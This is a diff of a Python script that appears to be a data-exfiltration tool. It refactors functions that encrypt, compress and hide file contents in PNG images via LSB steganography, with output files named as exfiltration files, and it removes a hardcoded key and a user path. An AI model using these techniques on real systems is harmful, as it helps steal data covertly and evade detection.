@@ -240,8 +240,8 @@ def maildata():
 #re.search searches the entire string
 #logical drives are partioned virtual drives of the hard drive. Ex: C: drive
 #The return value is a single string, with each drive letter NULL terminated.
-def encrypt(key , s, name, spaces):
-    global numBytes, numExfilFiles, numFiles, dT, eD,flg,gpath
+def encrypt():
+    global numExfilFiles,numFiles,gpath, key
     numF=1
     while numF<=numFiles:
         set2=""
@@ -322,7 +322,7 @@ def stego():
                 textAdd=line
                 secret = lsb.hide(gpath+"\\diamond_PNG6695.png", textAdd)
                 secret.save(gpath+"\\X"+str(numExfilFiles)+"combinedExfil.png")
-                print(lsb.reveal("C:\\Users\Dhvanil\Desktop\\X"+str(numExfilFiles)+"combinedExfil.png"))
+                print(lsb.reveal(gpath+"\\X"+str(numExfilFiles)+"combinedExfil.png"))
                 numExfilFiles+=1
                 if line==last:
                     secret = lsb.hide(gpath+"\\diamond_PNG6695.png", textAdd)
@@ -332,10 +332,8 @@ def stego():
 '''
 # -*- utf-8 -*-
 testing purposes, this code isn't needed or part of this
-import sys
-import string
-from urllib import request
-def encrypt():
+
+def encryptStego():
     with open(gpath+"\\imager.png", 'rb') as imagefile:
         bmp = imagefile.read()
     with open(gpath+"\\fakesecretfile.txt", 'rb') as textInfo:
@@ -530,8 +528,7 @@ def keepAsIs():
 def dataTransformationMethod(path, s, name, spaces):
     global numBytes, numExfilFiles, numFiles, dT, eD,gpath
     if dT==1:
-        key="turtlefly"
-        encrypt(key, s, name, spaces)
+        encrypt()
     if dT==2:
         compressionOfFile()
     if dT==3:
